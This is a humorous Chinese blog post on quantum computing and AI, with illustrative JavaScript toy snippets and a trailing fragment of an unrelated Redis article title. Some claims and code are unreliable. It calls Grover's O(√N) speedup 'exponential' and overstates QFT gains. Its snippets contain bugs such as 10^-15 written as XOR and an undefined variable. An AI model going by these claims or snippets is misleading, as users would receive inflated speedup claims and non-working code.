.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">序幕：当爱因斯坦的幽灵遇见图灵的机器 👻🤖</h2>
<p>深夜的实验室里，经典计算机的风扇嗡嗡作响，像一位疲惫的老管家在叹息。此时的你，或许正训练着第127个epoch的神经网络，看着loss曲线像蜗牛一样爬行，心里默念："这世上一定存在一条计算捷径！"</p>
<p>没错，那条捷径可能藏在<strong>量子力学</strong>最诡异的角落里。但别急着兴奋，让我们先掀开量子世界的幕布，看看里面到底是一群优雅的舞者，还是一帮喝醉了的电子在开狂欢派对 🎉</p>
<hr/>
<h2 data-id="heading-1">第一章：量子比特的"人格分裂"艺术 🎭</h2>
<h3 data-id="heading-2">经典比特 vs 量子比特：从"非黑即白"到"魔幻现实主义"</h3>
<p>经典比特就像个忠诚的单身狗：<code>0</code> 或 <code>1</code>，泾渭分明，绝不含糊。但量子比特（qubit）？那是个彻头彻尾的"海王"——它同时是 <code>0</code> <strong>和</strong> <code>1</code>，直到你观测它为止。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 经典比特：老实巴交的二进制</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassicalBit</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>; <span class="hljs-comment">// 确定性</span>
  }
  
  <span class="hljs-title function_">measure</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>; <span class="hljs-comment">// 测不测都一样，没惊喜</span>
  }
}

<span class="hljs-comment">// 量子比特：叠加态的社交达人</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">QuantumBit</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amplitudeZero</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-number">0.5</span>); <span class="hljs-comment">// 处于0的概率幅</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amplitudeOne</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-number">0.5</span>);  <span class="hljs-comment">// 处于1的概率幅</span>
    <span class="hljs-comment">// 注意：概率幅的平方才是概率！</span>
    <span class="hljs-comment">// 这就像 electron 既在这儿，又在那儿，直到老板看一眼</span>
  }
  
  <span class="hljs-title function_">measure</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 坍缩时刻！就像薛定谔打开盒子看猫</span>
    <span class="hljs-keyword">const</span> probZero = <span class="hljs-variable language_">this</span>.<span class="hljs-property">amplitudeZero</span> ** <span class="hljs-number">2</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; probZero ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;
  }
}

<span class="hljs-comment">// 创建两个比特</span>
<span class="hljs-keyword">const</span> classic = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassicalBit</span>();
<span class="hljs-keyword">const</span> quantum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QuantumBit</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`经典比特说：我是 <span class="hljs-subst">${classic.measure()}</span>，我自豪`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`量子比特说：我可能是0也可能是1，测了才知道 😇`</span>);
</code></pre>
<p><strong>底层原理</strong>：叠加态的本质是量子系统的线性组合。一个qubit的状态是 <code>α|0⟩ + β|1⟩</code>，其中 <code>α</code> 和 <code>β</code> 是复数概率幅，满足 <code>|α|² + |β|² = 1</code>。用JS理解就是：<strong>两个复数共同决定了一个量子态的命运</strong>，而经典比特只有一个实数0或1。</p>
<hr/>
<h2 data-id="heading-3">第二章：量子纠缠——电子界的"心电感应" 💕⚡</h2>
<h3 data-id="heading-4">当两个量子坠入爱河</h3>
<p>量子纠缠是量子计算真正的"黑魔法"。两个纠缠的qubits，即使相隔一个银河系，测量其中一个会<strong>瞬间</strong>决定另一个的状态。爱因斯坦骂这是"鬼魅般的超距作用"，但不好意思，实验反复证明：老爷子，这次您错了。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 制备贝尔态——最经典的纠缠态</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createEntangledPair</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 两个qubits的联合状态：</span>
  <span class="hljs-comment">// |Φ+⟩ = (|00⟩ + |11⟩) / sqrt(2)</span>
  <span class="hljs-comment">// 翻译成人话：要么都是0，要么都是1，概率各50%</span>
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">qubitA</span>: { <span class="hljs-attr">entangledWith</span>: <span class="hljs-string">'B'</span>, <span class="hljs-attr">state</span>: <span class="hljs-string">'superposition'</span> },
    <span class="hljs-attr">qubitB</span>: { <span class="hljs-attr">entangledWith</span>: <span class="hljs-string">'A'</span>, <span class="hljs-attr">state</span>: <span class="hljs-string">'superposition'</span> },
    
    <span class="hljs-title function_">measureBoth</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// 测量结果总是 correlated！</span>
      <span class="hljs-keyword">const</span> outcome = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; <span class="hljs-number">0.5</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">A</span>: outcome, <span class="hljs-attr">B</span>: outcome }; <span class="hljs-comment">// 永远一致！</span>
    }
  };
}

<span class="hljs-keyword">const</span> pair = <span class="hljs-title function_">createEntangledPair</span>();
<span class="hljs-keyword">const</span> result = pair.<span class="hljs-title function_">measureBoth</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`测得：A=<span class="hljs-subst">${result.A}</span>, B=<span class="hljs-subst">${result.B}</span> —— 心有灵犀一点通！ 💑`</span>);
</code></pre>
<p><strong>底层原理</strong>：纠缠态的测量结果具有非局域关联性。关键在于——<strong>没有信息超光速传递</strong>，只有关联性。这违反的是"局域实在论"，而非相对论。听起来像文字游戏？这就是量子力学的"哲学暴击"。</p>
<hr/>
<h2 data-id="heading-5">第三章：AI运算的"阿喀琉斯之踵" 🦵🏹</h2>
<h3 data-id="heading-6">经典计算的悲愤：维度诅咒与指数墙</h3>
<p>现代AI的核心是线性代数——矩阵乘法、梯度下降、反向传播。但当你的模型有1亿参数时，经典计算机就像在<strong>用独轮车搬运宇宙</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 经典神经网络：矩阵乘法的苦力劳动</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassicNeuralNetwork</span> {
  <span class="hljs-title function_">forwardPass</span>(<span class="hljs-params">inputVector, weightMatrix</span>) {
    <span class="hljs-comment">// 朴素矩阵乘法：O(n³) 复杂度</span>
    <span class="hljs-comment">// 1亿 × 1亿的矩阵？你的GPU会哭着喊妈妈</span>
    
    <span class="hljs-keyword">const</span> output = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; weightMatrix.<span class="hljs-property">length</span>; i++) {
      output[i] = <span class="hljs-number">0</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; inputVector.<span class="hljs-property">length</span>; j++) {
        output[i] += weightMatrix[i][j] * inputVector[j];
        <span class="hljs-comment">// 每一次乘加，都是一次硅基原子的悲鸣</span>
      }
    }
    <span class="hljs-keyword">return</span> output;
  }
}

<span class="hljs-comment">// 训练过程：反向传播——在超高维地形里盲人摸象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">backpropagate</span>(<span class="hljs-params">loss, learningRate</span>) {
  <span class="hljs-comment">// 计算梯度：∂Loss/∂W 需要链式法则</span>
  <span class="hljs-comment">// 在10⁸维空间里找最优解，像大海捞针</span>
  <span class="hljs-comment">// 局部极小值比银河系的星星还多！</span>
}
</code></pre>
<p><strong>核心瓶颈</strong>：</p>
<ol>
<li><strong>时间复杂度</strong>：深度学习的许多操作是多项式甚至指数级</li>
<li><strong>能量墙</strong>：训练GPT-3的碳排放相当于五辆汽车终身排放量</li>
<li><strong>并行性天花板</strong>：阿姆达尔定律像紧箍咒，限制并行提速</li>
</ol>
<hr/>
<h2 data-id="heading-7">第四章：量子算法的"作弊码" 🎮✨</h2>
<h3 data-id="heading-8">4.1 Grover算法：在无序列表里开"透视挂"</h3>
<p>经典搜索需要 <strong>O(N)</strong> 次查询。Grover算法只需 <strong>O(√N)</strong> ——对1百万条数据，查询次数从1百万降到1千。这不是提速，这是<strong>降维打击</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 经典搜索：笨办法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">classicSearch</span>(<span class="hljs-params">database, target</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; database.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">if</span> (database[i] === target) <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// 最坏情况查完所有</span>
  }
  <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
}

<span class="hljs-comment">// 量子搜索：Grover的"振幅放大"</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">quantumGroverSearch</span>(<span class="hljs-params">quantumDatabase, target</span>) {
  <span class="hljs-comment">// 步骤1：初始化叠加态，同时检查所有条目</span>
  <span class="hljs-comment">// |ψ⟩ = (1/√N) Σ|x⟩</span>
  
  <span class="hljs-comment">// 步骤2：反复应用"预言机"(oracle)和扩散算子</span>
  <span class="hljs-comment">// 每次迭代，目标态的振幅放大，非目标衰减</span>
  
  <span class="hljs-comment">// 约 √(N) 次后，测量得到目标的概率 &gt; 99%</span>
  
  <span class="hljs-keyword">const</span> iterations = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(database.<span class="hljs-property">length</span>) / <span class="hljs-number">4</span>);
  
  <span class="hljs-comment">// 核心思想：通过干涉让正确答案"脱颖而出"</span>
  <span class="hljs-comment">// 就像1000个人合唱，只有正确的人声音越来越大</span>
  
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">found</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">queries</span>: iterations };
}
</code></pre>
<p><strong>工程意义</strong>：在AI的超参数优化、特征选择中，Grover能指数级加速搜索空间遍历。</p>
<h3 data-id="heading-9">4.2 量子傅里叶变换：频域分析的"闪电战"</h3>
<p>经典FFT复杂度 <strong>O(N log N)</strong>。量子QFT仅需 <strong>O(log²N)</strong> ——对10亿数据点，经典需要300亿次操作，量子只要900次。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 经典FFT：蝴蝶操作，层层递归</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">classicFFT</span>(<span class="hljs-params">signal</span>) {
  <span class="hljs-comment">// 分治策略，但仍有O(N log N)复杂度</span>
  <span class="hljs-comment">// 处理1000×1000图像的频域？卡成PPT</span>
}

<span class="hljs-comment">// 量子QFT：并行性的极致</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">quantumFourierTransform</span>(<span class="hljs-params">qubitRegister</span>) {
  <span class="hljs-comment">// 对n个qubits，QFT将计算所有2^n个频率分量</span>
  <span class="hljs-comment">// 复杂度O(n²) —— n是qubits数，不是数据量！</span>
  
  <span class="hljs-comment">// 这就像同时问2^n个点："你的频率是多少？"</span>
  <span class="hljs-comment">// 量子并行性让指数级数据量坍缩为多项式操作</span>
  
  <span class="hljs-comment">// 应用：卷积神经网络、频域特征提取</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-10">第五章：量子机器学习的"桃花源" 🌸🤖</h2>
<h3 data-id="heading-11">5.1 量子神经网络(QNN)：神经元在希尔伯特空间里跳舞</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 量子感知机：用旋转门模拟激活函数</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">QuantumPerceptron</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">numQubits</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">qubits</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(numQubits).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QuantumBit</span>());
    <span class="hljs-comment">// 参数化量子电路(PQC)作为可训练模型</span>
  }
  
  <span class="hljs-comment">// 输入编码：将经典数据映射到量子态</span>
  <span class="hljs-title function_">encodeInput</span>(<span class="hljs-params">classicalData</span>) {
    <span class="hljs-comment">// 例如角度编码：|x⟩ = ⊗ᵢ cos(xᵢ)|0⟩ + sin(xᵢ)|1⟩</span>
    <span class="hljs-comment">// 把像素值转成qubit的旋转角度</span>
  }
  
  <span class="hljs-comment">// 变分电路：可训练的量子门</span>
  <span class="hljs-title function_">variationalLayer</span>(<span class="hljs-params">params</span>) {
    <span class="hljs-comment">// 应用Ry, Rz旋转门和CNOT纠缠门</span>
    <span class="hljs-comment">// params是经典优化参数，类似权重</span>
    
    <span class="hljs-comment">// 前向传播：</span>
    <span class="hljs-comment">// |ψ_out⟩ = U(θ) |ψ_in⟩</span>
    <span class="hljs-comment">// 量子态在希尔伯特空间里优雅旋转</span>
  }
  
  <span class="hljs-comment">// 测量期望：得到经典输出</span>
  <span class="hljs-title function_">measureExpectation</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 测量某个可观测量的期望值</span>
    <span class="hljs-comment">// 例如：σ_z 算子的期望</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">runQuantumCircuit</span>(); <span class="hljs-comment">// 返回0到1之间的值</span>
  }
  
  <span class="hljs-comment">// 反向传播：参数平移法则</span>
  <span class="hljs-title function_">gradientUpdate</span>(<span class="hljs-params">loss, learningRate</span>) {
    <span class="hljs-comment">// 经典技巧：无法直接求量子梯度，用参数平移：</span>
    <span class="hljs-comment">// ∂⟨O⟩/∂θ = (⟨O⟩(θ+π/2) - ⟨O⟩(θ-π/2)) / 2</span>
    <span class="hljs-comment">// 相当于量子版的有限差分</span>
  }
}
</code></pre>
<p><strong>底层优势</strong>：</p>
<ul>
<li><strong>指数级状态空间</strong>：n个qubits表示2^n维希尔伯特空间</li>
<li><strong>自然并行</strong>：一次操作影响所有基态</li>
<li><strong>复杂核函数</strong>：量子态内积天然是高维非线性核</li>
</ul>
<h3 data-id="heading-12">5.2 量子支持向量机：在高维空间"降维打击"</h3>
<p>经典SVM的核技巧计算代价高。量子版本(QSVM)用量子态内积作为核函数，天然计算高维相似度。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 量子核函数：计算数据在希尔伯特空间的相似度</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">quantumKernel</span>(<span class="hljs-params">vectorA, vectorB</span>) {
  <span class="hljs-comment">// 步骤1：制备量子态 |ψ_A⟩ 和 |ψ_B⟩</span>
  
  <span class="hljs-comment">// 步骤2：计算内积 |⟨ψ_A|ψ_B⟩|²</span>
  <span class="hljs-comment">// 这等价于测量两态相同的概率</span>
  
  <span class="hljs-comment">// 核心洞察：量子态相似度 = 经典数据相似度</span>
  <span class="hljs-comment">// 但在指数级大的特征空间里计算！</span>
  
  <span class="hljs-keyword">const</span> similarity = <span class="hljs-title function_">runSwapTest</span>(vectorA, vectorB);
  <span class="hljs-keyword">return</span> similarity; <span class="hljs-comment">// 核矩阵元素</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-13">第六章：现实的"冷水浴"：量子计算的"阿喀琉斯之踵" ❄️🦶</h2>
<h3 data-id="heading-14">6.1 退相干：量子处女座的"洁癖崩溃"</h3>
<p>量子态极其脆弱。环境温度、宇宙射线、甚至隔壁实验室的咖啡机震动，都会让qubit"泄气"，从叠加态坍缩成经典态。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 退相干模拟：美丽但短暂</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FragileQuantumSystem</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">coherenceTime</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// 微秒级，甚至纳秒级</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorRate</span> = <span class="hljs-number">0.001</span>;   <span class="hljs-comment">// 每门操作错误率</span>
  }
  
  <span class="hljs-title function_">runAlgorithm</span>(<span class="hljs-params">depth</span>) {
    <span class="hljs-comment">// 电路深度(depth) = 门操作数量</span>
    
    <span class="hljs-comment">// 总错误概率 = 1 - (1 - errorRate)^depth</span>
    <span class="hljs-comment">// 深度为1000时：1 - (0.999)^1000 ≈ 63% 失败率</span>
    
    <span class="hljs-keyword">if</span> (depth &gt; <span class="hljs-number">100</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"错误率爆炸！结果=噪声 🌪️"</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-string">"DECOHERED_NOISE"</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-string">"MAYBE_VALID"</span>;
  }
}

<span class="hljs-comment">// 现状：NISQ时代（含噪声中等规模量子）</span>
<span class="hljs-comment">// 50-1000 qubits，但错误率高，无纠错</span>
<span class="hljs-comment">// 像用有划痕的镜片看星空——模糊但能看到轮廓</span>
</code></pre>
<p><strong>底层敌人</strong>：</p>
<ul>
<li><strong>T1弛豫</strong>：从|1⟩衰变到|0⟩</li>
<li><strong>T2弛豫</strong>：相位信息丢失（更致命）</li>
<li><strong>控制误差</strong>：微波脉冲不完美</li>
<li><strong>串扰</strong>： neighboring qubits互相干扰</li>
</ul>
<h3 data-id="heading-15">6.2 量子纠错：数学奇迹的"代价"</h3>
<p>Shor编码：9个物理qubits保护1个逻辑qubit，错误率从p降到p²。表面码：需要上千个物理qubits才能实现一个完美逻辑qubit。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 纠错开销：豪华的数学保镖团</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">quantumErrorCorrectionRequirement</span>(<span class="hljs-params">baseErrorRate</span>) {
  <span class="hljs-comment">// 目标：逻辑错误率 &lt; 10^-15 (可实用)</span>
  
  <span class="hljs-keyword">const</span> physicalQubitsPerLogical = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(
    <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">10</span>^-<span class="hljs-number">15</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(baseErrorRate), 
    <span class="hljs-number">2</span>
  ); <span class="hljs-comment">// 近似估算</span>
  
  <span class="hljs-comment">// 如果baseErrorRate = 0.1%</span>
  <span class="hljs-comment">// 需要约 900 个物理qubits保护1个逻辑qubit</span>
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">physicalQubits</span>: physicalQubitsPerLogical,
    <span class="hljs-attr">overhead</span>: <span class="hljs-string">" astronomical 🌌"</span>
  };
}

<span class="hljs-comment">// 现状：2024年，最好的量子计算机约1000物理qubits</span>
<span class="hljs-comment">// 纠错后 ≈ 1个完美逻辑qubit（悲）😢</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">第七章：当前最佳实践：混合计算架构 🌉</h2>
<h3 data-id="heading-17">经典+量子：不是取代，而是联姻</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 实用量子AI工作流：VQE变分量子本征求解器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridQuantumAI</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">quantumProcessor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoisyQuantumChip</span>(<span class="hljs-number">50</span>); <span class="hljs-comment">// 50 qubits</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classicalOptimizer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdamOptimizer</span>();     <span class="hljs-comment">// 经典优化器</span>
  }
  
  <span class="hljs-title function_">trainQuantumLayer</span>(<span class="hljs-params">trainingData</span>) {
    <span class="hljs-comment">// 步骤1：经典预处理（归一化、降维）</span>
    <span class="hljs-keyword">const</span> processedData = <span class="hljs-variable language_">this</span>.<span class="hljs-property">classicalCPU</span>.<span class="hljs-title function_">preprocess</span>(trainingData);
    
    <span class="hljs-comment">// 步骤2：量子电路执行（参数化电路）</span>
    <span class="hljs-keyword">const</span> quantumCircuit = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildPQC</span>(processedData);
    
    <span class="hljs-comment">// 步骤3：测量期望（多次采样平均）</span>
    <span class="hljs-keyword">const</span> expectation = <span class="hljs-variable language_">this</span>.<span class="hljs-property">quantumProcessor</span>.<span class="hljs-title function_">run</span>(quantumCircuit, shots=<span class="hljs-number">10000</span>);
    
    <span class="hljs-comment">// 步骤4：经典后处理（梯度计算、参数更新）</span>
    <span class="hljs-keyword">const</span> loss = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateLoss</span>(expectation, labels);
    <span class="hljs-keyword">const</span> gradients = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">estimateGradients</span>(quantumCircuit);
    
    <span class="hljs-comment">// 步骤5：经典优化器更新参数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classicalOptimizer</span>.<span class="hljs-title function_">step</span>(gradients);
    
    <span class="hljs-comment">// 循环直到收敛...</span>
  }
}

<span class="hljs-comment">// 核心洞察：量子做它最擅长的（并行、干涉）</span>
<span class="hljs-comment">// 经典做它最擅长的（控制、存储、纠错）</span>
</code></pre>
<p><strong>成功案例</strong>：</p>
<ul>
<li><strong>药物发现</strong>：模拟分子基态（量子化学）</li>
<li><strong>金融建模</strong>：蒙特卡洛模拟的量子加速</li>
<li><strong>优化问题</strong>：量子退火解决TSP变种</li>
</ul>
<hr/>
<h2 data-id="heading-18">第八章：未来展望：理性狂欢还是泡沫幻影？ 🔮</h2>
<h3 data-id="heading-19">时间线预测（非官方，带点玄学）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> quantumAITimeline = {
  <span class="hljs-number">2025</span>: {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"NISQ末期"</span>,
    <span class="hljs-attr">reality</span>: <span class="hljs-string">"1000 qubits，无纠错，特定问题演示优势"</span>,
    <span class="hljs-attr">aiImpact</span>: <span class="hljs-string">"玩具级应用，学术玩具 🧸"</span>
  },
  
  <span class="hljs-number">2030</span>: {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"逻辑qubit突破"</span>,
    <span class="hljs-attr">reality</span>: <span class="hljs-string">"100逻辑qubits（约10万物理qubits）"</span>,
    <span class="hljs-attr">aiImpact</span>: <span class="hljs-string">"量子加速在小规模ML任务显现"</span>,
    <span class="hljs-attr">killerApp</span>: <span class="hljs-string">"量子化学 + 生成模型"</span>
  },
  
  <span class="hljs-number">2035</span>: {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"容错量子计算"</span>,
    <span class="hljs-attr">reality</span>: <span class="hljs-string">"1000逻辑qubits，错误率&lt;10^-12"</span>,
    <span class="hljs-attr">aiImpact</span>: <span class="hljs-string">"大规模QNN，量子强化学习"</span>,
    <span class="hljs-attr">paradigmShift</span>: <span class="hljs-string">"某些AI任务必须用量子"</span>
  },
  
  <span class="hljs-number">2040</span>: {
    <span class="hljs-attr">status</span>: <span class="hljs-string">"量子霸权2.0"</span>,
    <span class="hljs-attr">reality</span>: <span class="hljs-string">"百万逻辑qubits，室温拓扑量子计算？"</span>,
    <span class="hljs-attr">aiImpact</span>: <span class="hljs-string">"通用量子AI，AGI的量子助推器？"</span>,
    <span class="hljs-attr">caveat</span>: <span class="hljs-string">"也可能发现量子优势有限 😅"</span>
  }
};

<span class="hljs-comment">// 关键未知：</span>
<span class="hljs-comment">// 1. 能否实现室温超导量子计算？</span>
<span class="hljs-comment">// 2. 是否真有大规模量子优势？</span>
<span class="hljs-comment">// 3. 新算法突破（可能比硬件更重要）</span>
</code></pre>
<hr/>
<h2 data-id="heading-20">终章：结论——量子是"革命"还是"演进"？ 🎯</h2>
<h3 data-id="heading-21">核心答案：<strong>演进式的革命</strong>（Oxymoron，但很真实）</h3>
<p>量子计算不会"彻底"改变AI，但它会在<strong>特定战场</strong>掀起<strong>彻底革命</strong>：</p>









































<table><thead><tr><th>领域</th><th>经典AI</th><th>量子AI</th><th>变革程度</th></tr></thead><tbody><tr><td><strong>大数据线性代数</strong></td><td>优秀</td><td>可能更优</td><td>⭐⭐⭐</td></tr><tr><td><strong>组合优化</strong></td><td>痛苦</td><td>指数加速</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td><strong>生成模型采样</strong></td><td>MCMC慢</td><td>量子行走</td><td>⭐⭐⭐⭐</td></tr><tr><td><strong>模式识别</strong></td><td>CNN很牛</td><td>暂时不如</td><td>⭐⭐</td></tr><tr><td><strong>通用智能</strong></td><td>还行</td><td>遥遥无期</td><td>⭐</td></tr></tbody></table>
<p><strong>文学性总结</strong>：</p>
<p>量子计算不是AI的救世主，也不是泡沫。它更像是一位<strong>性格古怪的超级助手</strong>——当你需要求解一个10^30维空间的优化问题时，它会说："放着我来！"；但当你想让它识别猫狗图片时，它会翻白眼："这活找GPU去，别浪费我宝贵的相干时间。"</p>
<p>幽默的真相是：<strong>量子计算最擅长解决的问题，恰恰是经典计算最头痛的问题</strong>。而AI，恰好既有头痛之处，也有舒适区。所以，未来的图景不是量子取代经典，而是像一对跳探戈的恋人——经典AI负责稳健的步伐，量子计算负责惊艳的旋转。</p>
<hr/>
<h2 data-id="heading-22">给工程师的实践建议 🛠️</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 今天就可以做的：</span>
<span class="hljs-keyword">const</span> actionItems = [
  <span class="hljs-string">"学习Qiskit/Cirq量子SDK"</span>,
  <span class="hljs-string">"关注量子核方法论文"</span>,
  <span class="hljs-string">"在AWS Braket跑量子演示"</span>,
  <span class="hljs-string">"别扔掉你的GPU集群（重要！）"</span>,
  <span class="hljs-string">"对5年后的技术路线图保持乐观，对2年后的产品保持怀疑"</span>
];

<span class="hljs-comment">// 记住：量子AI的摩尔定律是"量子体积每年翻倍"</span>
<span class="hljs-comment">// 但经典AI的摩尔定律还没死透呢！</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[通过lua实现redis 分布式锁]]></title>    <link>https://juejin.cn/post/7589930672833216547</link>    <guid>https://juejin.cn/post/7589930672833216547</guid>    <pubDate>2026-01-01T08:07:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589930672833216547" data-draft-id="7589920318132764672" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="通过lua实现redis 分布式锁"/> <meta itemprop="keywords" content="Redis"/> <meta itemprop="datePublished" content="2026-01-01T08:07:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            通过lua实现redis 分布式锁
